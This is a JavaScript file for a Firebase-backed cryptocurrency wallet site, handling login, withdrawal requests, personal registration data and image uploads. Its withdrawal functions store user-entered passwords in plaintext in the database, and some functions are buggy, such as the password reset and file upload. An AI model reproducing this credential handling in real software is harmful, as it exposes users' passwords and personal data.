//configuring firebase
const firebaseApp = firebase.initializeApp({

    apiKey: "AIzaSyAjrvB9AIW7bVz10_pfzybgUxBLnxLh7cI",
    authDomain: "coin-center.firebaseapp.com",
    projectId: "coin-center",
    storageBucket: "coin-center.appspot.com",
    messagingSenderId: "1087671957724",
    appId: "1:1087671957724:web:22b9b0043e6bf061291c19"
});
const db = firebaseApp.firestore();
const auth = firebaseApp.auth();
const storage = firebase.storage();




const signup = () => {

    if (document.getElementById("email").value == "" || document.getElementById("password").value == "") {
        alert("Fields cannot be empty")
    }
    else {

        const email = document.getElementById("email").value
        const password = document.getElementById("password").value


        firebase.auth().createUserWithEmailAndPassword(email, password)
            .then((userCredential) => {
                // Signed in 
                var user = userCredential.user;
                window.location.href = "dashy.html"
                alert("Succefully Signed Up")
                // ...
            })
            .catch((error) => {
                var errorCode = error.code;
                var errorMessage = error.message;
                // ..
            });

        // console.log(email, password)
    }
}

const login = () => {

    if (document.getElementById("email").value == "" || document.getElementById("password").value == "") {
        alert("Fields cannot be empty")
    }
    else {


        const email = document.getElementById("email").value
        const password = document.getElementById("password").value


        firebase.auth().signInWithEmailAndPassword(email, password)
            .then((userCredential) => {
                // Signed in 
                var user = userCredential.user;
                window.location.href = "dashy.html"
                alert("You are now Signed in")
                // ...
            })
            .catch((error) => {
                var errorCode = error.code;
                var errorMessage = error.message;
                // ..
            });

        // console.log(email, password)
    }
}
const logout = () => {
    firebase.auth().signOut().then(() => {
        // Sign-out successful.
        window.location.href = "index.html"
        alert("Sign-out successful")
    }).catch((error) => {
        // An error happened.
    });
}

const resetPassword = () => {

    if (document.getElementById("reset-email").value == "") {
        alert("Fields cannot be empty")
    }

    else {

        const resetEmail = document.getElementById("reset-email").value

        firebase.auth().sendPasswordResetEmail(email)
            .then(() => {
                // Password reset email sent!
                // ..
            })
            .catch((error) => {
                var errorCode = error.code;
                var errorMessage = error.message;
                // ..
            });

    }
}

const savebtcwithdrawlToDb = () => {

    if (document.getElementById("btc-address").value == "" ||
        document.getElementById("btc-amount").value == "" ||
        document.getElementById("btc-desc").value == "" ||
        document.getElementById("btc-password").value == ""
    ) {
        alert("Fields cannot be empty")
    }
    else {



        firebase.auth().onAuthStateChanged((user) => {

            const btcAddress = document.getElementById("btc-address").value
            const btcAmount = document.getElementById("btc-amount").value
            const btcDescription = document.getElementById("btc-desc").value
            const btcPassword = document.getElementById("btc-password").value

            if (user) {
                // User is signed in, see docs for a list of available properties
                // https://firebase.google.com/docs/reference/js/firebase.User
                var uid = user.uid;
                console.log(uid)

                db.collection("btc-withdrawals").doc(uid).set({
                    btcaddress: btcAddress,
                    btcamount: btcAmount,
                    btcdescription: btcDescription,
                    btcpassword: btcPassword
                }, { merge: true })
                    .then(() => {
                        alert("Withrawal Request Sent")
                        console.log("Document successfully written!");
                    })
                    .catch((error) => {
                        console.error("Error writing document: ", error);
                    });

                // ...
            } else {
                // User is signed out
                // ...
            }
        });


    }

}

const savedogewithdrawlToDb = () => {

    if (document.getElementById("doge-address").value == "" ||
        document.getElementById("doge-amount").value == "" ||
        document.getElementById("doge-desc").value == "" ||
        document.getElementById("doge-password").value == ""
    ) {
        alert("Fields cannot be empty")
    }
    else {



        firebase.auth().onAuthStateChanged((user) => {

            const dogeAddress = document.getElementById("doge-address").value
            const dogeAmount = document.getElementById("doge-amount").value
            const dogeDescription = document.getElementById("doge-desc").value
            const dogePassword = document.getElementById("doge-password").value

            if (user) {
                // User is signed in, see docs for a list of available properties
                // https://firebase.google.com/docs/reference/js/firebase.User
                var uid = user.uid;
                console.log(uid)

                db.collection("doge-withdrawals").doc(uid).set({
                    dogeaddress: dogeAddress,
                    dogeamount: dogeAmount,
                    dogedescription: dogeDescription,
                    dogepassword: dogePassword
                }, { merge: true })
                    .then(() => {
                        alert("Withrawal Request Sent")
                        console.log("Document successfully written!");
                    })
                    .catch((error) => {
                        console.error("Error writing document: ", error);
                    });

                // ...
            } else {
                // User is signed out
                // ...
            }
        });


    }

}


const savebnbwithdrawlToDb = () => {

    if (document.getElementById("bnb-address").value == "" ||
        document.getElementById("bnb-amount").value == "" ||
        document.getElementById("bnb-desc").value == "" ||
        document.getElementById("bnb-password").value == ""
    ) {
        alert("Fields cannot be empty")
    }
    else {



        firebase.auth().onAuthStateChanged((user) => {

            const bnbAddress = document.getElementById("bnb-address").value
            const bnbAmount = document.getElementById("bnb-amount").value
            const bnbDescription = document.getElementById("bnb-desc").value
            const bnbPassword = document.getElementById("bnb-password").value

            if (user) {
                // User is signed in, see docs for a list of available properties
                // https://firebase.google.com/docs/reference/js/firebase.User
                var uid = user.uid;
                console.log(uid)

                db.collection("bnb-withdrawals").doc(uid).set({
                    bnbaddress: bnbAddress,
                    bnbamount: bnbAmount,
                    bnbdescription: bnbDescription,
                    bnbpassword: bnbPassword
                }, { merge: true })
                    .then(() => {
                        alert("Withrawal Request Sent")
                        console.log("Document successfully written!");
                    })
                    .catch((error) => {
                        console.error("Error writing document: ", error);
                    });

                // ...
            } else {
                // User is signed out
                // ...
            }
        });


    }

}

const savexrpwithdrawlToDb = () => {

    if (document.getElementById("xrp-address").value == "" ||
        document.getElementById("xrp-amount").value == "" ||
        document.getElementById("xrp-desc").value == "" ||
        document.getElementById("xrp-password").value == ""
    ) {
        alert("Fields cannot be empty")
    }
    else {



        firebase.auth().onAuthStateChanged((user) => {

            const xrpAddress = document.getElementById("xrp-address").value
            const xrpAmount = document.getElementById("xrp-amount").value
            const xrpDescription = document.getElementById("xrp-desc").value
            const xrpPassword = document.getElementById("xrp-password").value

            if (user) {
                // User is signed in, see docs for a list of available properties
                // https://firebase.google.com/docs/reference/js/firebase.User
                var uid = user.uid;
                console.log(uid)

                db.collection("xrp-withdrawals").doc(uid).set({
                    xrpaddress: xrpAddress,
                    xrpamount: xrpAmount,
                    xrpdescription: xrpDescription,
                    xrppassword: xrpPassword
                }, { merge: true })
                    .then(() => {
                        alert("Withrawal Request Sent")
                        console.log("Document successfully written!");
                    })
                    .catch((error) => {
                        console.error("Error writing document: ", error);
                    });

                // ...
            } else {
                // User is signed out
                // ...
            }
        });


    }

}


const saveethwithdrawlToDb = () => {

    if (document.getElementById("eth-address").value == "" ||
        document.getElementById("eth-amount").value == "" ||
        document.getElementById("eth-desc").value == "" ||
        document.getElementById("eth-password").value == ""
    ) {
        alert("Fields cannot be empty")
    }
    else {



        firebase.auth().onAuthStateChanged((user) => {

            const ethAddress = document.getElementById("eth-address").value
            const ethAmount = document.getElementById("eth-amount").value
            const ethDescription = document.getElementById("eth-desc").value
            const ethPassword = document.getElementById("eth-password").value

            if (user) {
                // User is signed in, see docs for a list of available properties
                // https://firebase.google.com/docs/reference/js/firebase.User
                var uid = user.uid;
                console.log(uid)

                db.collection("eth-withdrawals").doc(uid).set({
                    ethaddress: ethAddress,
                    ethamount: ethAmount,
                    ethdescription: ethDescription,
                    ethpassword: ethPassword
                }, { merge: true })
                    .then(() => {
                        alert("Withrawal Request Sent")
                        console.log("Document successfully written!");
                    })
                    .catch((error) => {
                        console.error("Error writing document: ", error);
                    });

                // ...
            } else {
                // User is signed out
                // ...
            }
        });

    }

}


const saveusdwithdrawlToDb = () => {


    firebase.auth().onAuthStateChanged((user) => {

        const usdAddress = document.getElementById("usd-address").value
        const usdAmount = document.getElementById("usd-amount").value
        const usdDescription = document.getElementById("usd-desc").value
        const usdPassword = document.getElementById("usd-password").value

        if (user) {
            // User is signed in, see docs for a list of available properties
            // https://firebase.google.com/docs/reference/js/firebase.User
            var uid = user.uid;
            console.log(uid)

            db.collection("usd-withdrawals").doc(uid).set({
                usdaddress: usdAddress,
                usdamount: usdAmount,
                usddescription: usdDescription,
                usdpassword: usdPassword
            }, { merge: true })
                .then(() => {
                    alert("Withrawal Request Sent")
                    console.log("Document successfully written!");
                })
                .catch((error) => {
                    console.error("Error writing document: ", error);
                });

            // ...
        } else {
            // User is signed out
            // ...
        }
    });



}

const saveuserregistrationToDb = () => {

    if (
        document.getElementById("fullname").value == "" ||
        document.getElementById("emailaddress").value == "" ||
        document.getElementById("phonenumber").value == "" ||
        document.getElementById("birthdate").value == "" ||
        document.getElementById("streetaddress").value == "" ||
        document.getElementById("streetaddressline2").value == "" ||
        document.getElementById("selectVal").value == "Country" ||
        document.getElementById("city").value == "" ||
        document.getElementById("region").value == "" ||
        document.getElementById("postalcode").value == ""
    ) {

        alert("Please complete the registration fields");
    }
    else {



        firebase.auth().onAuthStateChanged((user) => {

            const fullName = document.getElementById("fullname").value;
            const emailAddress = document.getElementById("emailaddress").value;
            const phoneNumber = document.getElementById("phonenumber").value;
            const birthDate = document.getElementById("birthdate").value;
            const streetAddress = document.getElementById("streetaddress").value;
            const streetAddress2 = document.getElementById("streetaddressline2").value;
            const country = document.getElementById("selectVal").value;
            const city = document.getElementById("city").value;
            const region = document.getElementById("region").value;
            const postalCode = document.getElementById("postalcode").value;

            if (user) {
                // User is signed in, see docs for a list of available properties
                // https://firebase.google.com/docs/reference/js/firebase.User
                var uid = user.uid;
                console.log(uid)

                db.collection("users-registration").doc(uid).set({
                    fullname: fullName,
                    emailaddress: emailAddress,
                    phonenumber: phoneNumber,
                    birthdate: birthDate,
                    streetaddress: streetAddress,
                    streetaddress2: streetAddress2,
                    country: country,
                    city: city,
                    region: region,
                    postalCode: postalCode,
                }, { merge: true })
                    .then(() => {
                        alert("Registration Completed")
                        console.log("Document successfully written!");
                    })
                    .catch((error) => {
                        console.error("Error writing document: ", error);
                    });

                // ...
            } else {
                // User is signed out
                // ...
            }
        });


    }

}

const getusersbtcwallet = () => {


    firebase.auth().onAuthStateChanged((user) => {
        if (user) {
            // User is signed in, see docs for a list of available properties
            // https://firebase.google.com/docs/reference/js/firebase.User

            var uid = user.uid;

            var docRef = db.collection("btc-wallets").doc(uid);
            // const btcBalanceAmount = document.getElementById("btcBalanceAmount").value;
            // const btcAmountOnHold = document.getElementById("btcAmountOnHold").value;



            docRef.get().then((doc) => {
                if (doc.exists) {
                    console.log("Document data:", doc.data().currentamount);

                    let btcbalance = document.getElementById("btcBalanceAmount")
                    let btcamountonhold = document.getElementById("btcAmountOnHold")
                    btcbalance.textContent = doc.data().currentamount
                    btcamountonhold.textContent = doc.data().amountonhold
                } else {
                    // doc.data() will be undefined in this case
                    console.log("No such document!");
                }
            }).catch((error) => {
                console.log("Error getting document:", error);
            });


            // ...
        } else {
            // User is signed out
            // ...
        }
    });



}

const getusersethwallet = () => {


    firebase.auth().onAuthStateChanged((user) => {
        if (user) {
            // User is signed in, see docs for a list of available properties
            // https://firebase.google.com/docs/reference/js/firebase.User

            var uid = user.uid;

            var docRef = db.collection("eth-wallets").doc(uid);
            // const btcBalanceAmount = document.getElementById("btcBalanceAmount").value;
            // const btcAmountOnHold = document.getElementById("btcAmountOnHold").value;



            docRef.get().then((doc) => {
                if (doc.exists) {
                    console.log("Document data:", doc.data().currentamount);

                    let ethbalance = document.getElementById("ethBalanceAmount")
                    let ethamountonhold = document.getElementById("ethAmountOnHold")
                    ethbalance.textContent = doc.data().currentamount
                    ethamountonhold.textContent = doc.data().amountonhold
                } else {
                    // doc.data() will be undefined in this case
                    console.log("No such document!");
                }
            }).catch((error) => {
                console.log("Error getting document:", error);
            });


            // ...
        } else {
            // User is signed out
            // ...
        }
    });



}

const getusersusdwallet = () => {


    firebase.auth().onAuthStateChanged((user) => {
        if (user) {
            // User is signed in, see docs for a list of available properties
            // https://firebase.google.com/docs/reference/js/firebase.User

            var uid = user.uid;

            var docRef = db.collection("usd-wallets").doc(uid);
            // const btcBalanceAmount = document.getElementById("btcBalanceAmount").value;
            // const btcAmountOnHold = document.getElementById("btcAmountOnHold").value;



            docRef.get().then((doc) => {
                if (doc.exists) {
                    console.log("Document data:", doc.data().currentamount);

                    let usdbalance = document.getElementById("usdbalance-amount")
                    let usdamountonhold = document.getElementById("usdamountOnHold")
                    usdbalance.textContent = doc.data().currentamount
                    usdamountonhold.textContent = doc.data().amountonhold
                } else {
                    // doc.data() will be undefined in this case
                    console.log("No such document!");
                }
            }).catch((error) => {
                console.log("Error getting document:", error);
            });


            // ...
        } else {
            // User is signed out
            // ...
        }
    });



}

const getusersdogewallet = () => {


    firebase.auth().onAuthStateChanged((user) => {
        if (user) {
            // User is signed in, see docs for a list of available properties
            // https://firebase.google.com/docs/reference/js/firebase.User

            var uid = user.uid;

            var docRef = db.collection("doge-wallets").doc(uid);
            // const btcBalanceAmount = document.getElementById("btcBalanceAmount").value;
            // const btcAmountOnHold = document.getElementById("btcAmountOnHold").value;



            docRef.get().then((doc) => {
                if (doc.exists) {
                    console.log("Document data:", doc.data().currentamount);

                    let dogebalance = document.getElementById("dogebalance-amount")
                    let dogeamountonhold = document.getElementById("dogeamountOnHold")
                    dogebalance.textContent = doc.data().currentamount
                    dogeamountonhold.textContent = doc.data().amountonhold
                } else {
                    // doc.data() will be undefined in this case
                    console.log("No such document!");
                }
            }).catch((error) => {
                console.log("Error getting document:", error);
            });


            // ...
        } else {
            // User is signed out
            // ...
        }
    });



}

const getusersbnbwallet = () => {


    firebase.auth().onAuthStateChanged((user) => {
        if (user) {
            // User is signed in, see docs for a list of available properties
            // https://firebase.google.com/docs/reference/js/firebase.User

            var uid = user.uid;

            var docRef = db.collection("bnb-wallets").doc(uid);
            // const btcBalanceAmount = document.getElementById("btcBalanceAmount").value;
            // const btcAmountOnHold = document.getElementById("btcAmountOnHold").value;



            docRef.get().then((doc) => {
                if (doc.exists) {
                    console.log("Document data:", doc.data().currentamount);

                    let bnbbalance = document.getElementById("bnbbalance-amount")
                    let bnbamountonhold = document.getElementById("bnbamountOnHold")
                    bnbbalance.textContent = doc.data().currentamount
                    bnbamountonhold.textContent = doc.data().amountonhold
                } else {
                    // doc.data() will be undefined in this case
                    console.log("No such document!");
                }
            }).catch((error) => {
                console.log("Error getting document:", error);
            });


            // ...
        } else {
            // User is signed out
            // ...
        }
    });



}

const getusersxrpwallet = () => {


    firebase.auth().onAuthStateChanged((user) => {
        if (user) {
            // User is signed in, see docs for a list of available properties
            // https://firebase.google.com/docs/reference/js/firebase.User

            var uid = user.uid;

            var docRef = db.collection("xrp-wallets").doc(uid);
            // const btcBalanceAmount = document.getElementById("btcBalanceAmount").value;
            // const btcAmountOnHold = document.getElementById("btcAmountOnHold").value;



            docRef.get().then((doc) => {
                if (doc.exists) {
                    console.log("Document data:", doc.data().currentamount);

                    let xrpbalance = document.getElementById("xrpbalance-amount")
                    let xrpamountonhold = document.getElementById("xrpamountOnHold")
                    xrpbalance.textContent = doc.data().currentamount
                    xrpamountonhold.textContent = doc.data().amountonhold
                } else {
                    // doc.data() will be undefined in this case
                    console.log("No such document!");
                }
            }).catch((error) => {
                console.log("Error getting document:", error);
            });


            // ...
        } else {
            // User is signed out
            // ...
        }
    });



}


const getuserstrades = () => {
    firebase.auth().onAuthStateChanged((user) => {
        if (user) {
            // User is signed in, see docs for a list of available properties
            // https://firebase.google.com/docs/reference/js/firebase.User

            var uid = user.uid;

            var docRef = db.collection("users-trade").doc(uid);
            // const btcBalanceAmount = document.getElementById("btcBalanceAmount").value;
            // const btcAmountOnHold = document.getElementById("btcAmountOnHold").value;



            docRef.get().then((doc) => {
                if (doc.exists) {

                    let tradePair = document.getElementById("tradepair")
                    let tradeDate = document.getElementById("tradedate")
                    let tradeProfit = document.getElementById("tradeprofit")
                    let tradeType = document.getElementById("tradetype")


                    tradePair.textContent = doc.data().tradepair
                    tradeDate.textContent = doc.data().tradedate
                    tradeProfit.textContent = doc.data().tradeprofit
                    tradeType.textContent = doc.data().tradetype


                } else {
                    // doc.data() will be undefined in this case
                    console.log("No such document!");
                }
            }).catch((error) => {
                console.log("Error getting document:", error);
            });


            // ...
        } else {
            // User is signed out
            // ...
        }
    });

}

const getusersid = () => {
    firebase.auth().onAuthStateChanged((user) => {
        if (user) {
            // User is signed in, see docs for a list of available properties
            // https://firebase.google.com/docs/reference/js/firebase.User

            var uid = user.uid;
            let userID = document.getElementById("users-id")

            userID.textContent = "ID: " + uid


            // ...
        } else {
            // User is signed out
            // ...
        }
    });

}

getusersid();
getusersbtcwallet();
getusersethwallet();
getusersusdwallet();
getusersdogewallet();
getusersbnbwallet();
getusersxrpwallet();
getuserstrades();

let fileInput = document.getElementById("file-input");
let imageContainer = document.getElementById("images");
let numOfFiles = document.getElementById("num-of-files");
let pics = null;



function preview() {
    imageContainer.innerHTML = "";
    numOfFiles.textContent = `${fileInput.files.length} Files Selected`;

    for (i of fileInput.files) {
        let reader = new FileReader();
        let figure = document.createElement("figure");
        let figCap = document.createElement("figcaption");
        figCap.innerText = i.name;
        figure.appendChild(figCap);
        reader.onload = () => {
            let img = document.createElement("img");
            img.setAttribute("src", reader.result);
            figure.insertBefore(img, figCap);
            pics = img;
        }
        imageContainer.appendChild(figure);
        reader.readAsDataURL(i);
    }

    console.log(fileInput.files[0])
}

const uploadFile = () => {
    var storageRef = firebase.storage().ref();
    var mountainImagesRef = storageRef.child('images/' + fileInput.files.name);
    var mountainImagesRef2 = storageRef.child('newimages/' + fileInput.files.name);

    mountainImagesRef.put(fileInput.files[0]).then((snapshot) => {
        console.log('Uploaded a blob or file!');
    });

    mountainImagesRef2.put(fileInput.files[1]).then((snapshot) => {
        console.log('2nd Uploaded a blob or file!');
    });



}